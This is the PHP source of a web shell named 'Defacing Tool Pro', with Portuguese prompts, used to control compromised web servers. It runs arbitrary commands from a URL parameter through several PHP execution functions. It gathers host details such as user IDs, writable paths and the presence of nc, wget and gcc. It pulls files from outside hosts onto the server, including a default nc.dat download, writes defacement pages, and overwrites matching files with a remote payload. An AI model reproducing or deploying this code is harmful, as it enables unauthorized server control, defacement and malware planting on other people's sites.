<?php

if(empty($chdir)) $chdir = @$_GET['chdir'];
if(empty($cmd)) $cmd = @$_GET['cmd'];
if(empty($fu)) $fu = @$_GET['fu'];
if(empty($list)) $list = @$_GET['list'];

if(empty($chdir) or $chdir=='') $chdir=getcwd();
$cmd = stripslashes(trim($cmd));


//CHDIR tool
if (strpos($cmd, 'chdir')!==false and strpos($cmd, 'chdir')=='0'){
	$boom = explode(" ",$cmd,2);
	$boom2 = explode(";",$boom['1'], 2);
	$toDir = $boom2['0'];

	if($boom['1']=="/")$chdir="";
	else if(strpos($cmd, 'chdir ..')!==false){
		$cadaDir = array_reverse(explode("/",$chdir));

		if($cadaDir['0']=="" or $cadaDir['0'] ==" ") $lastDir = $cadaDir['1']."/";
		else{ $lastDir = $cadaDir['0']."/"; $chdir = $chdir."/";}
		$toDir = str_replace($lastDir,"",$chdir);
		if($toDir=="/")$chdir="";
	}
	else if(strpos($cmd, 'chdir .')===0) $toDir = getcwd();
	else if(strpos($cmd, 'chdir ~')===0) $toDir = getcwd();

	if(strrpos($toDir,"/")==(strlen($toDir)-1)) $toDir=substr($toDir,0,strrpos($toDir,"/"));
	if(@opendir($toDir)!==false or @is_dir($toDir)) $chdir=$toDir;
	else if(@opendir($chdir."/".$toDir)!==false or @is_dir($chdir."/".$toDir)) $chdir=$chdir."/".$toDir;
	else $ch_msg="dtool: line 1: chdir: $toDir: No such directory.\n";
	if($boom2['1']==null) $cmd = trim($boom['2']); else $cmd = trim($boom2['1'].$boom2['2']);
	if(strpos($chdir, '//')!==false) $chdir = str_replace('//', '/', $chdir);
}
if(!@opendir($chdir)) $ch_msg="dtool: line 1: chdir: It seems that the permission have been denied in dir '$chdir'. Anyway, you can try to send a command here now. If you haven't accessed it, try to use 'cd' in the cmd line instead.\n";
$cmdShow = $cmd;

//To keep the changes in the url, when using the 'GET' way to send php variables
if(empty($post)){
	if($chdir==getcwd() or empty($chdir) or $chdir=="")$showdir="";else $showdir="+'chdir=$chdir&'";
	if($fu=="" or $fu=="0" or empty($fu))$showfu="";else $showfu="+'fu=$fu&'";
	if($list=="" or $list=="0" or empty($list)){$showfl="";$fl="on";}else{$showfl="+'list=1&'"; $fl="off";}
}

//INFO table (pro and normal)
if (@file_exists("/usr/X11R6/bin/xterm")) $pro1="<i>xterm</i> at /usr/X11R6/bin/xterm, ";
if (@file_exists("/usr/bin/nc")) $pro2="<i>nc</i> at /usr/bin/nc, ";
if (@file_exists("/usr/bin/wget")) $pro3="<i>wget</i> at /usr/bin/wget, ";
if (@file_exists("/usr/bin/lynx")) $pro4="<i>lynx</i> at /usr/bin/lynx, ";
if (@file_exists("/usr/bin/gcc")) $pro5="<i>gcc</i> at /usr/bin/gcc, ";
if (@file_exists("/usr/bin/cc")) $pro6="<i>cc</i> at /usr/bin/cc ";
$safe = @ini_get($safemode);
if ($safe) $pro8="<b><i>safe_mode</i>: YES</b>, "; else $pro7="<b><i>safe_mode</i>: NO</b>, ";
$pro8 = "<i>PHP </i>".phpversion();
$pro=$pro1.$pro2.$pro3.$pro4.$pro5.$pro6.$pro7.$pro8;
$login=@posix_getuid(); $euid=@posix_geteuid(); $gid=@posix_getgid();
$ip=@gethostbyname($_SERVER['HTTP_HOST']);

//Turns the 'ls' command more usefull, showing it as it looks in the shell
if(strpos($cmd, 'ls --') !==false) $cmd = str_replace('ls --', 'ls -F --', $cmd);
else if(strpos($cmd, 'ls -') !==false) $cmd = str_replace('ls -', 'ls -F', $cmd);
else if(strpos($cmd, ';ls') !==false) $cmd = str_replace(';ls', ';ls -F', $cmd);
else if(strpos($cmd, '; ls') !==false) $cmd = str_replace('; ls', ';ls -F', $cmd);
else if($cmd=='ls') $cmd = "ls -F";

//If there are some '//' in the cmd, its now removed
if(strpos($chdir, '//')!==false) $chdir = str_replace('//', '/', $chdir);
?>
<body onload="focar();">
<style>.campo{font-family: Verdana; color:white;font-size:11px;background-color:#414978;height:23px}
.infop{font-family: verdana; font-size: 10px; color:#000000;}
.infod{font-family: verdana; font-size: 10px; color:#414978;}
.algod{font-family: verdana; font-size: 12px; font-weight: bold; color: #414978;}
.titulod{font:Verdana; color:#414978; font-size:20px;}</style>
<script>
function inclVar(){var addr = location.href.substring(0,location.href.indexOf('?')+1);var stri = location.href.substring(addr.length,location.href.length+1);inclvar = stri.substring(0,stri.indexOf('='));}
function enviaCMD(){inclVar();window.document.location.href='<?=$total_addr;?>'+'?'+inclvar+'='+'<?=$cmd_addr;?>'+'?&'<?=$showdir.$showfu.$showfl;?>+'cmd='+window.document.formulario.cmd.value;return false;}
function ativaFe(qual){inclVar();window.document.location.href='<?=$total_addr;?>'+'?'+inclvar+'='+'<?=$cmd_addr;?>'+'?&'<?=$showdir.$showfl;?>+'fu='+qual+'&cmd='+window.document.formulario.cmd.value;return false;}
function PHPget(){inclVar(); if(confirm("O PHPget agora oferece uma lista pronta de urls,\nvc soh precisa escolher qual arquivo enviar para o servidor.\nDeseja utilizar isso? \nClique em Cancel para usar o PHPget normal, ou \nem Ok para usar esse novo recurso."))goPreGet(); else{var c=prompt("[ PHPget ] by r3v3ng4ns\nDigite a ORIGEM do arquivo (url) com ate 7Mb\n-Utilize caminho completo\n-Se for remoto, use http:// ou ftp://:","http://hostinganime.com/tool/nc.dat");var dir = c.substring(0,c.lastIndexOf('/')+1);var file = c.substring(dir.length,c.length+1);var p=prompt("[ PHPget ] by r3v3ng4ns\nDigite o DESTINO do arquivo\n-Utilize caminho completo\n-O diretorio de destino deve ser writable","<?=$chdir;?>/"+file);window.open('<?=$total_addr;?>'+'?'+inclvar+'='+'<?=$phpget_addr;?>'+'?&'+'inclvar='+inclvar+'&'<?=$showdir;?>+'c='+c+'&p='+p);}}
function goPreGet(){inclVar();window.open('<?=$total_addr;?>'+'?'+inclvar+'='+'<?=$phpget_addr;?>'+'?&'+'inclvar='+inclvar+'&'<?=$showdir;?>+'pre=1');}
function PHPwriter(){inclVar();var url=prompt("[ PHPwriter ] by r3v3ng4ns\nDigite a URL do frame","http://hostinganime.com/tool/reven.htm");var dir = url.substring(0,url.lastIndexOf('/')+1);var file = url.substring(dir.length,url.length+1);var f=prompt("[ PHPwriter ] by r3v3ng4ns\nDigite o Nome do arquivo a ser criado\n-Utilize caminho completo\n-O diretorio de destino deve ser writable","<?=$chdir;?>/"+file); t=prompt("[ PHPwriter ] by r3v3ng4ns\nDigite o Title da pagina","[ r00ted team ] owned you :P - by r3v3ng4ns");window.open('<?=$total_addr;?>'+'?'+inclvar+'='+'<?=$writer_addr;?>'+'?&'+'inclvar='+inclvar+'&'<?=$showdir;?>+'url='+url+'&f='+f+'&t='+t);}
function PHPf(){inclVar();var o=prompt("[ PHPfilEditor ] by r3v3ng4ns\nDigite o nome do arquivo que deseja abrir\n-Utilize caminho completo\n-Abrir arquivos remotos, use http:// ou ftp://","<?=$chdir;?>/index.php"); var dir = o.substring(0,o.lastIndexOf('/')+1);var file = o.substring(dir.length,o.length+1);window.open('<?=$total_addr;?>?'+inclvar+'=<?=$feditor_addr;?>?&inclvar='+inclvar+'&o='+o);}
function safeMode(){inclVar();if (confirm ('Deseja ativar o DTool com suporte a SafeMode?')){window.document.location.href='<?=$total_addr;?>'+'?'+inclvar+'='+'<?=$safe_addr;?>'+'?&'<?=$showdir;?>;}else{ return false }}
function list(turn){inclVar();if(turn=="off")turn=0;else if(turn=="on")turn=1; window.document.location.href='<?=$total_addr;?>'+'?'+inclvar+'='+'<?=$cmd_addr;?>'+'?&'<?=$showdir.$showfu;?>+'list='+turn+'&cmd='+window.document.formulario.cmd.value;return false;}
function overwrite(){inclVar();if(confirm("O script tentara substituir todos os arquivos (do diretorio atual) que\nteem no nome a palavra chave especificada. Os arquivos serao\nsubstituidos pelo novo arquivo, especificado por voce.\n\nLembre-se!\n-Se for para substituir arquivos com a extensao jpg, utilize\ncomo palavra chave .jpg (inclusive o ponto!)\n-Utilize caminho completo para o novo arquivo, e se for remoto,\nutilize http:// e ftp://")){keyw=prompt("Digite a palavra chave",".jpg");newf=prompt("Digite a origem do arquivo que substituira","http://www.colegioparthenon.com.br/ingles/bins/revenmail.jpg");if(confirm("Se ocorrer um erro e o arquivo nao puder ser substituido, deseja\nque o script apague os arquivos e crie-os novamente com o novo conteudo?\nLembre-se de que para criar novos arquivos, o diretorio deve ser writable.")){trydel=1}else{trydel=0} if(confirm("Deseja substituir todos os arquivos do diretorio\n<?=$chdir;?> que contenham a palavra\n"+keyw+" no nome pelo novo arquivo de origem\n"+newf+" ?\nIsso pode levar um tempo, dependendo da quantidade de\narquivos e do tamanho do arquivo de origem.")){window.location.href='<?=$total_addr;?>?'+inclvar+'=<?=$cmd_addr;?>?&chdir=<?=$chdir;?>&list=1&'<?=$showfu?>+'&keyw='+keyw+'&newf='+newf+'&trydel='+trydel;return false;}}}
</script>
<table width="760" border="0" align="center" cellpadding="2" cellspacing="0" bgcolor="#FFFFFF">
<tr><td><div align="center" class="titulod"><b>[ Defacing Tool Pro v<?=$vers;?> ] <a href="mailto:revengans@gmail.com">?</a></font><br>
<font size=3>by r3v3ng4ns - revengans@gmail.com </font>
</b></div></td></tr>
<tr><td><TABLE width="370" BORDER="0" align="center" CELLPADDING="0" CELLSPACING="0">
<?php
 $uname = @posix_uname();
 while (list($info, $value) = each ($uname)) { ?>
<TR><TD><DIV class="infop"><b><?=$info ?>:</b> <?=$value;?></DIV></TD></TR><?php } ?>
<TR><TD><DIV class="infop"><b>user:</b> uid(<?=$login;?>) euid(<?=$euid;?>) gid(<?=$gid;?>)</DIV></TD></TR>
<TR><TD><DIV class="infod"><b>write permission:</b><? if(@is_writable($chdir)){ echo " <b>YES</b>"; }else{ echo " no"; } ?></DIV></TD></TR>
<TR><TD><DIV class="infop"><b>server info: </b><?="$SERVER_SOFTWARE $SERVER_VERSION";?></DIV></TD></TR>
<TR><TD><DIV class="infop"><b>pro info: ip </b><?="$ip, $pro";?></DIV></TD></TR>
<? if($chdir!=getcwd()){?>
<TR><TD><DIV class="infop"><b>original path: </b><?=getcwd() ?></DIV></TD></TR><? } ?>
<TR><TD><DIV class="infod"><b>current path: </b><?=$chdir ?>
</DIV></TD></TR></TABLE></td></tr>
<tr><td><form name="formulario" id="formulario" method="post" action="#" onSubmit="return enviaCMD()">
<table width="375" border="1" align="center" cellpadding="0" cellspacing="0" bordercolor="#414978"><tr><td><table width="370" border="0" align="center" cellpadding="1" cellspacing="1" bgcolor="white"><tr>
<td width="75"><DIV class="algod">command</DIV></td>
<td width="300"><input name="cmd" type="text" id="cmd" value='<?=$cmdShow;?>' style="width:295; font-size:12px" class="campo">
<script>
function focar(){window.document.formulario.cmd.focus();window.document.formulario.cmd.select();}
</script>
</td></tr></table><table><tr><td>
<?php
ob_start();
if(isset($chdir)) @chdir($chdir);
function safemode($what){echo "This server is in safemode. Try to use DTool in Safemode.";}
function nofunction($what){echo "The admin disabled all the functions to send a cmd to the system.";}
function shell($what){echo(shell_exec($what));}
function popenn($what){
	$handle=popen("$what", "r");
	$out=@fread($handle, 2096);
	echo $out;
	@pclose($handle);
}
function execc($what){
	exec("$what",$array_out);
	$out=implode("\n",$array_out);
	echo $out;
}
function procc($what){
	//na sequencia: stdin, stdout, sterr
	if($descpec = array(0 => array("pipe", "r"),1 => array("pipe", "w"),2 => array("pipe", "w"),)){
	$process = @proc_open("$what",$descpec,$pipes);
	if (is_resource($process)) {
		fwrite($pipes[0], "");
		fclose($pipes[0]);

		while(!feof($pipes[2])) {
			$erro_retorno = fgets($pipes[2], 4096);
			if(!empty($erro_retorno)) echo $erro_retorno;//isso mostra tds os erros
		}
    		fclose($pipes[2]);

		while(!feof($pipes[1])) {
			echo fgets($pipes[1], 4096);
		}
		fclose($pipes[1]);

		$ok_p_fecha = @proc_close($process);
	}else echo "It seems that this PHP version (".phpversion().") doesn't support proc_open() function";
}else echo "This PHP version ($pro7) doesn't have the proc_open() or this function is disabled by php.ini";
}

$funE="function_exists";
if($safe){$fe="safemode";$feshow=$fe;}
elseif($funE('shell_exec')){$fe="shell";$feshow="shell_exec";}
elseif($funE('passthru')){$fe="passthru";$feshow=$fe;}
elseif($funE('system')){$fe="system";$feshow=$fe;}
elseif($funE('exec')){$fe="execc";$feshow="exec";}
elseif($funE('popen')){$fe="popenn";$feshow="popen";}
elseif($funE('proc_open')){$fe="procc";$feshow="proc_open";}
else {$fe="nofunction";$feshow=$fe;}
if($fu!="0" or !empty($fu)){
  if($fu==1){$fe="passthru";$feshow=$fe;}
  if($fu==2){$fe="system";$feshow=$fe;}
  if($fu==3){$fe="execc";$feshow="exec";}
  if($fu==4){$fe="popenn";$feshow="popen";}
  if($fu==5){$fe="shell";$feshow="shell_exec";}
  if($fu==6){$fe="procc";$feshow="proc_open";}
}
$fe("$cmd 2>&1");
$output=ob_get_contents();ob_end_clean();
?>
<td><input type="button" name="snd" value="send cmd" class="campo" style="background-color:#313654" onClick="enviaCMD()"><select name="qualF" id="qualF" class="campo" style="background-color:#313654" onchange="ativaFe(this.value);">
<option><?="using $feshow()";?>
<option value="1">use passthru()
<option value="2">use system()
<option value="3">use exec()
<option value="4">use popen()
<option value="5">use shell_exec()
<option value="6">use proc_open()*new
<option value="0">auto detect (default)
</select><input type="button" name="getBtn" value="PHPget" class="campo" onClick="PHPget()"><input type="button" name="writerBtn" value="PHPwriter" class="campo" onClick="PHPwriter()"><br><input type="button" name="edBtn" value="fileditor" class="campo" onClick="PHPf()"><input type="button" name="listBtn" value="list files <?=$fl;?>" class="campo" onClick="list('<?=$fl;?>')"><? if ($list==1){ ?><input type="button" name="sbstBtn" value="overwrite files" class="campo" onClick="overwrite()"><input type="button" name="MkDirBtn" value="mkdir" class="campo" onClick="mkDirF()"><input type="button" name="ChModBtn" value="chmod" class="campo" onClick="chmod()"><br>
<? } ?><input type="button" name="smBtn" value="safemode" class="campo" onClick="safeMode()">
</tr></table></td></tr></table></form></td></tr>
<tr><td align="center"><DIV class="algod"><br>stdOut from <?="\"<i>$cmdShow</i>\", using <i>$feshow()</i>";?></i></DIV>
<TEXTAREA name="output_text" COLS="90" ROWS="10" STYLE="font-family:Courier; font-size: 12px; color:#FFFFFF; font-size:11 px; background-color:black;width:683;">
<?php
echo $ch_msg;
if (empty($cmd) and $ch_msg=="") echo ("Comandos Exclusivos do DTool Pro\n\nchdir <diretorio>; outros; cmds;\nMuda o diretorio para aquele especificado e permanece nele. Eh como se fosse o 'cd' numa shell, mas precisa ser o primeiro da linha. Os arquivos listados pelo filelist sao o do diretorio especificado ex: chdir /diretorio/sub/;pwd;ls\n\nPHPget, PHPwriter, Fileditor, File List e Overwrite\nfale com o r3v3ng4ns :P");
if (!empty($output)) echo str_replace(">", ">", str_replace("<", "<", $output));
?></TEXTAREA><BR></td></tr>
<?php
if($list=="1") @include($remote_addr."flist".$format_addr);
?>
</table>

